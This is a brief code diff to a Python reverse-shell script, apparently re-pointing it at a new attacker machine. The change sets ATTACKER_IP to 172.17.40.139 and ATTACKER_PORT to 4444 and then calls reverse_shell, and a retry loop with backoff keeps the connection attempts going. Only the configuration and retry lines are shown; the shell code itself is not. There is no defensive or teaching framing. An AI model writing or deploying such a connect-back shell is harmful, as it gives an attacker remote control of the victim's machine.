@@ -42,7 +42,7 @@ def reverse_shell(attacker_ip, attacker_port):
             retry_delay = min(retry_delay * 2, 60)
 
 if __name__ == "__main__":
-    ATTACKER_IP = "192.168.1.68"  # Change to your server's IP
-    ATTACKER_PORT = 4433           # Change to your server's port
+    ATTACKER_IP = "172.17.40.139"  # Change to your server's IP
+    ATTACKER_PORT = 4444           # Change to your server's port
 
     reverse_shell(ATTACKER_IP, ATTACKER_PORT)
